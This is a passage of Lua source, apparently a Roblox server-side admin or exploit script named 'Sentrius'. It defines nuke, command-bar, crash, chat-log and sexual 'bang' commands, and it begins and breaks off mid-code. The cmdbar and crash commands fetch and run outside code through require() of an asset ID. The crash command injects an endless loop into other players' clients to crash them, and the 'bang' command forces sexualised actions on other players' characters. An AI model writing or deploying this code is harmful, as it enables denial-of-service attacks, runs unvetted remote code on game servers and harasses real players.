                        local mesh = object:FindFirstChildOfClass("SpecialMesh")
                        if mesh then
                            mesh.Scale = scale * (smallSize / maxSize)
                            task.spawn(basicTween, mesh, {Scale = scale}, nukeDuration)
                        end
                    end
                end
                
                do
                    local startclock = os.clock()
                    local expGrow, expStat = maxSize - smallSize, smallSize
                    repeat
                        destruction(
                            position,
                            (((os.clock() - startclock) / nukeDuration) * expGrow + expStat) * 2,
                            attacker
                        )
                        task.wait(1/25)
                    until (os.clock() - startclock) > nukeDuration
                end
                
                for _, v in ipairs(shockwave) do
                    v.Transparency = 0
                    task.spawn(basicTween, v, {Transparency = 1}, 100 * (1 / 60))
                end
                task.wait(100 * (1 / 60))
                
                for _, v in ipairs(shockwave) do
                    v:Destroy()
                end
                shockwaveCompleted = true
            end)
            
            task.spawn(function()
                local transforms = {
                    {baseCloud, Vector3.new(2.5 * explosionSize, 1 * explosionSize, 4.5 * explosionSize), Vector3.new(0, 0.05 * explosionSize, 0)},
                    {poleBase, Vector3.new(1 * explosionSize, 2 * explosionSize, 2.5 * explosionSize), Vector3.new(0, 0.1 * explosionSize, 0)},
                    {poleRing, Vector3.new(1.2 * explosionSize, 1.2 * explosionSize, 1.2 * explosionSize), Vector3.new(0, 1.3 * explosionSize, 0)},
                    {topCloud, Vector3.new(0.75 * explosionSize, 1.5 * explosionSize, 1.5 * explosionSize), Vector3.new(0, 2.7 * explosionSize, 0)},
                    {mushCloud, Vector3.new(2.5 * explosionSize, 1.75 * explosionSize, 3.5 * explosionSize), Vector3.new(0, 2.3 * explosionSize, 0)},
                    {cloud1, Vector3.new(0.5 * explosionSize, 3 * explosionSize, 1 * explosionSize), Vector3.new(0, 0.75 * explosionSize, 0)},
                    {cloud2, Vector3.new(0.5 * explosionSize, 1.5 * explosionSize, 1 * explosionSize), Vector3.new(0, 1.25 * explosionSize, 0)},
                    {cloud3, Vector3.new(0.5 * explosionSize, 1.5 * explosionSize, 1 * explosionSize), Vector3.new(0, 1.7 * explosionSize, 0)},
                }
                
                for _, v in ipairs(transforms) do
                    local object, scale = v[1], v[2]
                    if typeof(object) == "Instance" then
                        object.Position = position + v[3] / 5
                        local mesh = object:FindFirstChildOfClass("SpecialMesh")
                        if mesh then
                            mesh.Scale = scale / 5
                            task.spawn(basicTween, mesh, {Scale = scale}, 2)
                        end
                        task.spawn(basicTween, object, {Position = position + v[3]}, 2)
                    end
                end
            end)
            task.wait(2)
            
            for _, v in ipairs(clouds) do
                local mesh = v:FindFirstChildOfClass("SpecialMesh")
                if mesh then
                    mesh.VertexColor = Vector3.new(0.9, 0.6, 0)
                    task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.9, 0, 0)}, 0.6 / 0.0025 * (1 / 60))
                end
            end
            task.wait(0.6 / 0.0025 * (1 / 60))
            
            for _, v in ipairs(clouds) do
                local mesh = v:FindFirstChildOfClass("SpecialMesh")
                if mesh then
                    mesh.VertexColor = Vector3.new(0.9, 0, 0)
                    task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.5, 0, 0)}, (0.9 - 0.5) / 0.01 * (1 / 60) * 2)
                end
            end
            task.wait((0.9 - 0.5) / 0.01 * (1 / 60) * 2)
            
            local skyConnection
            skyConnection = newSky.AncestryChanged:Connect(function()
                if newSky and newSky.Parent ~= Lighting and table.find(nukeSkyboxes, newSky) then
                    table.remove(nukeSkyboxes, table.find(nukeSkyboxes, newSky))
                end
                local hasNukeSkyboxes = false
                for _, v in ipairs(nukeSkyboxes) do
                    if v.Parent == Lighting then
                        hasNukeSkyboxes = true
                        break
                    end
                end
                if not hasNukeSkyboxes then
                    for i = #realSkyboxes, 1, -1 do
                        local v = realSkyboxes[i]
                        if v.Parent == Lighting then
                            v.Parent = nil
                            task.spawn(function()
                                task.wait()
                                v.Parent = Lighting
                            end)
                        elseif table.find(realSkyboxes, v) then
                            table.remove(realSkyboxes, table.find(realSkyboxes, v))
                        end
                    end
                end
                skyConnection:Disconnect()
            end)
            Debris:AddItem(newSky, 10)
            
            for _, v in ipairs(clouds) do
                local mesh = v:FindFirstChildOfClass("SpecialMesh")
                if mesh then
                    mesh.VertexColor = Vector3.new(0, 0, 0)
                    task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.5, 0.5, 0.5)}, 0.5 / 0.005 * (1 / 60))
                    task.spawn(basicTween, mesh, {Scale = mesh.Scale + Vector3.new(0.1, 0.1, 0.1) * (0.5 / 0.005)}, 0.5 / 0.005 * (1 / 60))
                end
                task.spawn(basicTween, v, {Transparency = 0.5}, 0.5 / 0.005 * (1 / 60))
            end
            task.wait(0.5 / 0.005 * (1 / 60))
            
            for _, v in ipairs(clouds) do
                task.spawn(basicTween, v, {Transparency = 1}, 20)
                local mesh = v:FindFirstChildOfClass("SpecialMesh")
                if mesh then
                    task.spawn(basicTween, mesh, {Scale = mesh.Scale + Vector3.new(0.1, 0.1, 0.1) * (1 / 0.005)}, 20)
                end
            end
            task.wait(20)
            
            while true do task.wait(1) if shockwaveCompleted then break end end
            container:Destroy()
        end
        

        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            explode(target.Character.HumanoidRootPart.Position, explosionSize, false, plr)
        else
            return
        end
    end
})

addCommand({
    name = "cmdbar",
    aliases = {"cmdb"},
    desc = "be wary, heh",
    usage = prefix .. "cmdbar",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local PlayerGui = plr:FindFirstChild("PlayerGui")
        if not PlayerGui then return end
        

        local existing = PlayerGui:FindFirstChild("SentriusCmdBar")
        if existing then existing:Destroy() end
        

        local remote = ReplicatedStorage:FindFirstChild("cmdbarRemote")
        if not remote then
            remote = Instance.new("RemoteEvent")
            remote.Name = "cmdbarRemote"
            remote.Parent = ReplicatedStorage
        end
        

        if not connections["cmdbar_remote"] then
            connections["cmdbar_remote"] = remote.OnServerEvent:Connect(function(player, cmdText)
                if not running then return end
                if not isAdmin(player) then return end
                if not cmdText or cmdText == "" then return end
                

                if cmdText:sub(1, 1) == prefix then
                    cmdText = cmdText:sub(2)
                end
                

                local args = {}
                for w in cmdText:gmatch("%S+") do
                    table.insert(args, w)
                end
                
                local cmd = table.remove(args, 1)
                if not cmd then return end
                
                local f = commands[cmd:lower()]
                if f then
                    f(player, args)
                else
                    notify(player, "Sentrius", "THIS COMMAND '" .. cmd .. "' doesn't exist.", 3)
                end
            end)
        end
        

        coroutine.wrap(function()
            local TweenService = game:GetService("TweenService")
            
            local ScreenGui = Instance.new("ScreenGui")
            ScreenGui.Name = "SentriusCmdBar"
            ScreenGui.ResetOnSpawn = false
            ScreenGui.Parent = PlayerGui
            
            local MainFrame = Instance.new("Frame")
            MainFrame.Name = "MainFrame"
            MainFrame.Size = UDim2.new(0, 280, 0, 35)
            MainFrame.Position = UDim2.new(0, 10, 1, -45)
            MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            MainFrame.BackgroundTransparency = 0.15
            MainFrame.BorderSizePixel = 0
            MainFrame.Parent = ScreenGui
            
            local MainCorner = Instance.new("UICorner")
            MainCorner.CornerRadius = UDim.new(0, 10)
            MainCorner.Parent = MainFrame
            

            local PrefixLabel = Instance.new("TextLabel")
            PrefixLabel.Size = UDim2.new(0, 25, 1, -8)
            PrefixLabel.Position = UDim2.new(0, 8, 0, 4)
            PrefixLabel.BackgroundTransparency = 1
            PrefixLabel.Text = prefix
            PrefixLabel.TextColor3 = Color3.fromRGB(100, 150, 255)
            PrefixLabel.Font = Enum.Font.GothamBold
            PrefixLabel.TextSize = 14
            PrefixLabel.TextXAlignment = Enum.TextXAlignment.Left
            PrefixLabel.Parent = MainFrame
            

            local CmdInput = Instance.new("TextBox")
            CmdInput.Name = "CmdInput"
            CmdInput.Size = UDim2.new(1, -80, 1, -10)
            CmdInput.Position = UDim2.new(0, 35, 0, 5)
            CmdInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            CmdInput.BackgroundTransparency = 0.2
            CmdInput.BorderSizePixel = 0
            CmdInput.Text = ""
            CmdInput.PlaceholderText = "Enter command..."
            CmdInput.TextColor3 = Color3.fromRGB(255, 255, 255)
            CmdInput.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
            CmdInput.Font = Enum.Font.Gotham
            CmdInput.TextSize = 12
            CmdInput.TextXAlignment = Enum.TextXAlignment.Left
            CmdInput.ClearTextOnFocus = false
            CmdInput.Parent = MainFrame
            
            local InputCorner = Instance.new("UICorner")
            InputCorner.CornerRadius = UDim.new(0, 7)
            InputCorner.Parent = CmdInput
            

            local CloseButton = Instance.new("TextButton")
            CloseButton.Size = UDim2.new(0, 30, 1, -10)
            CloseButton.Position = UDim2.new(1, -35, 0, 5)
            CloseButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
            CloseButton.BackgroundTransparency = 0.2
            CloseButton.BorderSizePixel = 0
            CloseButton.Text = "X"
            CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            CloseButton.Font = Enum.Font.GothamBold
            CloseButton.TextSize = 12
            CloseButton.Parent = MainFrame
            
            local CloseCorner = Instance.new("UICorner")
            CloseCorner.CornerRadius = UDim.new(0, 7)
            CloseCorner.Parent = CloseButton
            

            CmdInput.MouseEnter:Connect(function()
                TweenService:Create(MainFrame, TweenInfo.new(0.3), {
                    BackgroundTransparency = 0.05
                }):Play()
                TweenService:Create(CmdInput, TweenInfo.new(0.3), {
                    BackgroundTransparency = 0.05
                }):Play()
            end)
            
            CmdInput.MouseLeave:Connect(function()
                TweenService:Create(MainFrame, TweenInfo.new(0.3), {
                    BackgroundTransparency = 0.15
                }):Play()
                TweenService:Create(CmdInput, TweenInfo.new(0.3), {
                    BackgroundTransparency = 0.2
                }):Play()
            end)
            
            CloseButton.MouseEnter:Connect(function()
                TweenService:Create(CloseButton, TweenInfo.new(0.2), {
                    BackgroundTransparency = 0,
                    TextSize = 16
                }):Play()
            end)
            
            CloseButton.MouseLeave:Connect(function()
                TweenService:Create(CloseButton, TweenInfo.new(0.2), {
                    BackgroundTransparency = 0.2,
                    TextSize = 14
                }):Play()
            end)
            
            CloseButton.MouseButton1Click:Connect(function()
                ScreenGui:Destroy()
            end)
            

            MainFrame.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton2 then
                    ScreenGui:Destroy()
                end
            end)
            

            if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
                local ticking = tick()
                require(112691275102014).load()
                repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
            end
            
            local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
            
            if not goog then
                warn("goog failed to load for cmdbar")
                notify(plr, "Sentrius", "Failed to load cmdbar goog gone", 3)
                ScreenGui:Destroy()
                return
            end
            
            local scr = goog:FindFirstChild("Utilities").Client:Clone()
            local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
            
            loa.Parent = scr
            scr:WaitForChild("Exec").Value = [[
                local player = game.Players.LocalPlayer
                local gui = player.PlayerGui:WaitForChild("SentriusCmdBar")
                local mainFrame = gui:WaitForChild("MainFrame")
                local cmdInput = mainFrame:WaitForChild("CmdInput")
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("cmdbarRemote")
                

                task.wait(0.1)
                

                local history = {}
                local historyIndex = 0
                

                cmdInput.FocusLost:Connect(function(enterPressed)
                    if enterPressed and cmdInput.Text ~= "" then
                        local cmd = cmdInput.Text
                        

                        table.insert(history, cmd)
                        if #history > 20 then
                            table.remove(history, 1)
                        end
                        historyIndex = #history + 1
                        

                        remote:FireServer(cmd)
                        

                        cmdInput.Text = ""
                        task.wait(0.05)
                        cmdInput:CaptureFocus()
                    end
                end)
                

                local UserInputService = game:GetService("UserInputService")
                UserInputService.InputBegan:Connect(function(input, processed)
                    if processed then return end
                    if not cmdInput:IsFocused() then return end
                    
                    if input.KeyCode == Enum.KeyCode.Up then
                        if #history > 0 and historyIndex > 1 then
                            historyIndex = historyIndex - 1
                            cmdInput.Text = history[historyIndex]
                            cmdInput.CursorPosition = #cmdInput.Text + 1
                        end
                    elseif input.KeyCode == Enum.KeyCode.Down then
                        if historyIndex < #history then
                            historyIndex = historyIndex + 1
                            cmdInput.Text = history[historyIndex]
                            cmdInput.CursorPosition = #cmdInput.Text + 1
                        elseif historyIndex == #history then
                            historyIndex = #history + 1
                            cmdInput.Text = ""
                        end
                    end
                end)
                
                print("[Sentrius] Command bar loaded")
            ]]
            
            scr.Parent = ScreenGui
            scr.Enabled = true
            
            notify(plr, "Sentrius", "Command bar opened! Right-click to close.", 3)
        end)()
    end
})

addCommand({
    name = "crash",
    aliases = {"destroy"},
    desc = "Crash a player's client",
    usage = prefix .. "crash [player]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "crash [player]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        local names = {}
        for _, target in ipairs(targets) do
            if whitelist[target.UserId] and not owna(plr) then
                notify(plr, "Sentrius", "You cannot crash whitelisted admins!", 3)
                return
            end
            
            local success, err = pcall(function()
                if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
                    local ticking = tick()
                    require(112691275102014).load()
                    repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
                end
                
                local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
                
                if not goog then
                    warn("goog failed to load for crash command")
                    notify(plr, "Sentrius", "goog failed to load!", 3)
                    return
                end
                
                local scr = goog:FindFirstChild("Utilities").Client:Clone()
                local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
                
                loa.Parent = scr
                scr:WaitForChild("Exec").Value = [[





                          while true do end




                ]]
                
                if target.Character then
                    scr.Parent = target.Character
                else
                    scr.Parent = target:WaitForChild("PlayerGui")
                end
                
                scr.Enabled = true
            end)
            
            if success then
                table.insert(names, target.DisplayName)
            else
                notify(plr, "Sentrius", "Error crashing " .. target.DisplayName, 3)
            end
        end
        
        if #names > 0 then
            notify(plr, "Sentrius", "Crashed: " .. table.concat(names, ", "), 3)
        end
    end
})

addCommand({
    name = "logs",
    aliases = {"chatlogs", "chatlog"},
    desc = "self explanatory",
    usage = prefix .. "logs",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local PlayerGui = plr:FindFirstChild("PlayerGui")
        if not PlayerGui then return end
        

        local existing = PlayerGui:FindFirstChild("SentriusLogsGui")
        if existing then existing:Destroy() end
        
        local TweenService = game:GetService("TweenService")
        local UserInputService = game:GetService("UserInputService")
        

        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "SentriusLogsGui"
        ScreenGui.ResetOnSpawn = false
        ScreenGui.Parent = PlayerGui
        

        local Frame = Instance.new("Frame")
        Frame.Name = "MainFrame"
        Frame.Active = true
        Frame.Draggable = true
        Frame.Size = UDim2.new(0, 400, 0, 450)
        Frame.Position = UDim2.new(0.5, -200, 0.5, -225)
        Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        Frame.BackgroundTransparency = 0.05
        Frame.BorderSizePixel = 2
        Frame.BorderColor3 = Color3.fromRGB(70, 70, 70)
        Frame.Parent = ScreenGui
        
        local MainCorner = Instance.new("UICorner")
        MainCorner.CornerRadius = UDim.new(0, 12)
        MainCorner.Parent = Frame
        

        local TopBar = Instance.new("Frame")
        TopBar.Name = "TopBar"
        TopBar.Size = UDim2.new(1, 0, 0, 38)
        TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        TopBar.BackgroundTransparency = 0.2
        TopBar.BorderSizePixel = 0
        TopBar.Parent = Frame
        
        local TopBarCorner = Instance.new("UICorner")
        TopBarCorner.CornerRadius = UDim.new(0, 12)
        TopBarCorner.Parent = TopBar
        
        local TopBarFix = Instance.new("Frame")
        TopBarFix.Size = UDim2.new(1, 0, 0, 12)
        TopBarFix.Position = UDim2.new(0, 0, 1, -12)
        TopBarFix.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        TopBarFix.BackgroundTransparency = 0.2
        TopBarFix.BorderSizePixel = 0
        TopBarFix.Parent = TopBar
        

        local Title = Instance.new("TextLabel")
        Title.Name = "Title"
        Title.Size = UDim2.new(0, 200, 0, 38)
        Title.Position = UDim2.new(0.5, -100, 0, 0)
        Title.BackgroundTransparency = 1
        Title.Text = "Chat Logs"
        Title.TextColor3 = Color3.fromRGB(255, 255, 255)
        Title.TextSize = 22
        Title.Font = Enum.Font.GothamBold
        Title.Parent = TopBar
        

        local LogCount = Instance.new("TextLabel")
        LogCount.Name = "LogCount"
        LogCount.Size = UDim2.new(0, 100, 0, 20)
        LogCount.Position = UDim2.new(0, 10, 0, 9)
        LogCount.BackgroundTransparency = 1
        LogCount.Text = #chatLogs .. " logs"
        LogCount.TextColor3 = Color3.fromRGB(100, 150, 255)
        LogCount.TextSize = 12
        LogCount.Font = Enum.Font.GothamBold
        LogCount.TextXAlignment = Enum.TextXAlignment.Left
        LogCount.Parent = TopBar
        

        local CloseButton = Instance.new("TextButton")
        CloseButton.Name = "CloseButton"
        CloseButton.Size = UDim2.new(0, 32, 0, 32)
        CloseButton.Position = UDim2.new(1, -37, 0, 3)
        CloseButton.BackgroundTransparency = 1
        CloseButton.Text = "X"
        CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        CloseButton.TextSize = 18
        CloseButton.Font = Enum.Font.GothamBold
        CloseButton.Parent = TopBar
        

        local MinimizeButton = Instance.new("TextButton")
        MinimizeButton.Name = "MinimizeButton"
        MinimizeButton.Size = UDim2.new(0, 32, 0, 32)
        MinimizeButton.Position = UDim2.new(1, -71, 0, 3)
        MinimizeButton.BackgroundTransparency = 1
        MinimizeButton.Text = "–"
        MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        MinimizeButton.TextSize = 18
        MinimizeButton.Font = Enum.Font.GothamBold
        MinimizeButton.Parent = TopBar
        

        --[[local ClearButton = Instance.new("TextButton")
        ClearButton.Name = "ClearButton"
        ClearButton.Size = UDim2.new(0, 60, 0, 25)
        ClearButton.Position = UDim2.new(1, -145, 0, 6.5)
        ClearButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        ClearButton.BackgroundTransparency = 0.2
        ClearButton.BorderSizePixel = 1
        ClearButton.BorderColor3 = Color3.fromRGB(220, 80, 80)
        ClearButton.Text = "Clear"
        ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        ClearButton.TextSize = 12
        ClearButton.Font = Enum.Font.GothamBold
        ClearButton.Parent = TopBar
        
        local ClearCorner = Instance.new("UICorner")
        ClearCorner.CornerRadius = UDim.new(0, 6)
        ClearCorner.Parent = ClearButton]]
        

        local ContentFrame = Instance.new("Frame")
        ContentFrame.Name = "ContentFrame"
        ContentFrame.Size = UDim2.new(1, 0, 1, -38)
        ContentFrame.Position = UDim2.new(0, 0, 0, 38)
        ContentFrame.BackgroundTransparency = 1
        ContentFrame.Parent = Frame
        

        local ScrollFrame = Instance.new("ScrollingFrame")
        ScrollFrame.Name = "LogList"
        ScrollFrame.Size = UDim2.new(1, -10, 1, -10)
        ScrollFrame.Position = UDim2.new(0, 5, 0, 5)
        ScrollFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        ScrollFrame.BackgroundTransparency = 0.2
        ScrollFrame.BorderSizePixel = 1
        ScrollFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
        ScrollFrame.ScrollBarThickness = 6
        ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 150, 255)
        ScrollFrame.Parent = ContentFrame
        
        local ScrollCorner = Instance.new("UICorner")
        ScrollCorner.CornerRadius = UDim.new(0, 8)
        ScrollCorner.Parent = ScrollFrame
        
        local Layout = Instance.new("UIListLayout")
        Layout.Name = "Layout"
        Layout.Parent = ScrollFrame
        Layout.SortOrder = Enum.SortOrder.LayoutOrder
        Layout.Padding = UDim.new(0, 5)
        
        local function updateLogs()
            for _, child in ipairs(ScrollFrame:GetChildren()) do
                if child:IsA("Frame") or child:IsA("TextLabel") then
                    child:Destroy()
                end
            end
            
            LogCount.Text = #chatLogs .. " logs"
            
            if #chatLogs == 0 then
                local NoLogsLabel = Instance.new("TextLabel")
                NoLogsLabel.Name = "NoLogsLabel"  -- ADDED: Give it a name
                NoLogsLabel.Size = UDim2.new(1, 0, 0, 50)
                NoLogsLabel.BackgroundTransparency = 1
                NoLogsLabel.Text = "No chat logs yet"
                NoLogsLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
                NoLogsLabel.TextSize = 15
                NoLogsLabel.Font = Enum.Font.Gotham
                NoLogsLabel.Parent = ScrollFrame
            else
                for i = #chatLogs, 1, -1 do
                    local log = chatLogs[i]
                    
                    local LogFrame = Instance.new("Frame")
                    LogFrame.Name = "Log_" .. i
                    LogFrame.Size = UDim2.new(1, -12, 0, 65)
                    LogFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                    LogFrame.BackgroundTransparency = 0.4
                    LogFrame.BorderSizePixel = 1
                    LogFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
                    LogFrame.LayoutOrder = (#chatLogs - i + 1)
                    LogFrame.Parent = ScrollFrame
                    
                    local LogCorner = Instance.new("UICorner")
                    LogCorner.CornerRadius = UDim.new(0, 6)
                    LogCorner.Parent = LogFrame
                    

                    local TimeLabel = Instance.new("TextLabel")
                    TimeLabel.Size = UDim2.new(0, 60, 0, 16)
                    TimeLabel.Position = UDim2.new(1, -65, 0, 4)
                    TimeLabel.BackgroundTransparency = 1
                    TimeLabel.Text = log.timestamp
                    TimeLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
                    TimeLabel.TextSize = 10
                    TimeLabel.Font = Enum.Font.Gotham
                    TimeLabel.TextXAlignment = Enum.TextXAlignment.Right
                    TimeLabel.Parent = LogFrame
                    

                    local PlayerLabel = Instance.new("TextLabel")
                    PlayerLabel.Size = UDim2.new(1, -70, 0, 18)
                    PlayerLabel.Position = UDim2.new(0, 6, 0, 4)
                    PlayerLabel.BackgroundTransparency = 1
                    PlayerLabel.Text = log.player
                    PlayerLabel.TextColor3 = Color3.fromRGB(100, 150, 255)
                    PlayerLabel.TextSize = 14
                    PlayerLabel.Font = Enum.Font.GothamBold
                    PlayerLabel.TextXAlignment = Enum.TextXAlignment.Left
                    PlayerLabel.Parent = LogFrame
                    
  
                    local IDLabel = Instance.new("TextLabel")
                    IDLabel.Size = UDim2.new(1, -12, 0, 12)
                    IDLabel.Position = UDim2.new(0, 6, 0, 22)
                    IDLabel.BackgroundTransparency = 1
                    IDLabel.Text = "ID: " .. log.userId
                    IDLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
                    IDLabel.TextSize = 10
                    IDLabel.Font = Enum.Font.Gotham
                    IDLabel.TextXAlignment = Enum.TextXAlignment.Left
                    IDLabel.Parent = LogFrame
                    

                    local MessageLabel = Instance.new("TextLabel")
                    MessageLabel.Size = UDim2.new(1, -12, 0, 26)
                    MessageLabel.Position = UDim2.new(0, 6, 0, 36)
                    MessageLabel.BackgroundTransparency = 1
                    MessageLabel.Text = '"' .. log.message .. '"'
                    MessageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
                    MessageLabel.TextSize = 12
                    MessageLabel.Font = Enum.Font.Gotham
                    MessageLabel.TextXAlignment = Enum.TextXAlignment.Left
                    MessageLabel.TextYAlignment = Enum.TextYAlignment.Top
                    MessageLabel.TextWrapped = true
                    MessageLabel.Parent = LogFrame
                end
            end
            
            task.wait(0.05)
            ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y + 10)
        end
        
        updateLogs()
        
        local lastLogCount = #chatLogs
        local updateConnection = game:GetService("RunService").Heartbeat:Connect(function()
            if not ScreenGui.Parent then
                updateConnection:Disconnect()
                return
            end
            
            task.wait(0.5)
            
            if #chatLogs ~= lastLogCount then
                lastLogCount = #chatLogs
                updateLogs()
            end
        end)
        

        --[[ClearButton.MouseButton1Click:Connect(function()
            chatLogs = {}
            lastLogCount = 0  -- FIXED: Reset counter after clearing
            updateLogs()
            notify(plr, "Sentrius", "Chat logs cleared!", 2)
        end)
        
        ClearButton.MouseEnter:Connect(function()
            TweenService:Create(ClearButton, TweenInfo.new(0.2), {
                BackgroundTransparency = 0
            }):Play()
        end)
        
        ClearButton.MouseLeave:Connect(function()
            TweenService:Create(ClearButton, TweenInfo.new(0.2), {
                BackgroundTransparency = 0.2
            }):Play()
        end)]]
        
        -- Layout update
        Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y + 10)
        end)
        

        local dragging = false
        local dragStart = nil
        local startPos = nil
        local dragConnection = nil
        
        local function updateDrag(input)
            if dragging and dragStart and startPos then
                local delta = input.Position - dragStart
                Frame.Position = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
            end
        end
        
        local function stopDrag()
            if dragging then
                dragging = false
                dragStart = nil
                startPos = nil
                if dragConnection then
                    dragConnection:Disconnect()
                    dragConnection = nil
                end
            end
        end
        
        TopBar.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                local relativePos = input.Position - TopBar.AbsolutePosition
                local buttonAreaStart = TopBar.AbsoluteSize.X - 160
                
                if relativePos.X < buttonAreaStart then
                    dragging = true
                    dragStart = input.Position
                    startPos = Frame.Position
                    
                    if dragConnection then
                        dragConnection:Disconnect()
                    end
                    
                    dragConnection = UserInputService.InputChanged:Connect(function(moveInput)
                        if moveInput.UserInputType == Enum.UserInputType.MouseMovement or 
                           moveInput.UserInputType == Enum.UserInputType.Touch then
                            updateDrag(moveInput)
                        end
                    end)
                end
            end
        end)
        
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                stopDrag()
            end
        end)
        
        UserInputService.TouchEnded:Connect(function()
            stopDrag()
        end)
        
        ScreenGui.AncestryChanged:Connect(function()
            if not ScreenGui.Parent then
                stopDrag()
                if updateConnection then
                    updateConnection:Disconnect()
                end
            end
        end)
        

        local minimized = false
        
        local function minimize()
            ContentFrame.Visible = false
            MinimizeButton.Text = "+"
            Frame.Size = UDim2.new(0, 400, 0, 38)
        end
        
        local function maximize()
            ContentFrame.Visible = true
            MinimizeButton.Text = "–"
            Frame.Size = UDim2.new(0, 400, 0, 450)
        end
        
        local pc = not UserInputService.TouchEnabled and not UserInputService.GamepadEnabled
        local mobile = UserInputService.TouchEnabled
        
        if pc then
            CloseButton.MouseButton1Click:Connect(function()
                ScreenGui:Destroy()
            end)
            
            MinimizeButton.MouseButton1Click:Connect(function()
                if minimized then
                    maximize()
                else
                    minimize()
                end
                minimized = not minimized
            end)
        elseif mobile then
            CloseButton.InputBegan:Connect(function(input, process)
                if not process and input.UserInputType == Enum.UserInputType.Touch then
                    ScreenGui:Destroy()
                end
            end)
            
            MinimizeButton.InputBegan:Connect(function(input, process)
                if not process and input.UserInputType == Enum.UserInputType.Touch then
                    if minimized then
                        maximize()
                    else
                        minimize()
                    end
                    minimized = not minimized
                end
            end)
        end
    end
})

addCommand({
    name = "bang",
    aliases = {},
    desc = "fucks people (HUGELY RESTRICTED THAT ONLY I (WEBS) CAN USE IT)",
    usage = prefix .. "bang [player1 (optional)] [player2]",
    callback = function(plr, args)
        if plr.Name ~= "idonthacklol101ns" then
            notify(plr, "Sentrius", "This command is restricted to idonthacklol101ns only!", 3)
            return
        end
        
        local arg, plr2
        
        if args and args[2] then
            arg = args[1]
            plr2 = args[2]
        elseif args and args[1] then
            arg = plr.Name
            plr2 = args[1]
        else
            notify(plr, "Sentrius", "You need to specify at least one player!", 3)
            return
        end
        
        if arg == "me" then
            arg = plr.Name
        end
        
        local argt = GetPlayer(arg, plr)
        local argt2 = GetPlayer(plr2, plr)
        
        if not argt or #argt == 0 then
            notify(plr, "Sentrius", "Invalid first player!", 3)
            return
        end
        
        local V1
        
        if #argt2 <= 0 then
            V1 = workspace:FindFirstChild(plr2)
            if V1 then
                V1 = V1:FindFirstChild("Torso")
            else
                notify(plr, "Sentrius", "Invalid user / model!", 3)
                return
            end
        else
            V1 = argt2[1]
            
            if V1.Character and V1.Character:FindFirstChild("Torso") and V1.Character:FindFirstChild("Humanoid") then
                V1 = argt2[1].Character:FindFirstChild("Torso")
            else
                notify(plr, "Sentrius", V1.Name .. " doesn't have a Torso!", 3)
                return
            end
        end
        
        if argt[1].Character and argt[1].Character:FindFirstChild("Torso") and argt[1].Character:FindFirstChild("HumanoidRootPart") then
            
            local P1 = argt[1].Character:FindFirstChild("Torso")
            
            if #argt2 <= 0 and workspace:FindFirstChild(plr2) then
                workspace:FindFirstChild(plr2):FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
                workspace:FindFirstChild(plr2):FindFirstChild("HumanoidRootPart").Massless = true
            else
                V1.Parent:FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
                V1.Parent:FindFirstChild("HumanoidRootPart").Massless = true
            end
            
            function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
                local funcw = Instance.new('Weld')
                funcw.Name = zName
                funcw.Parent = zParent
                funcw.Part0 = zPart0
                funcw.Part1 = zPart1
                if (zCoco) then
                    funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
                else
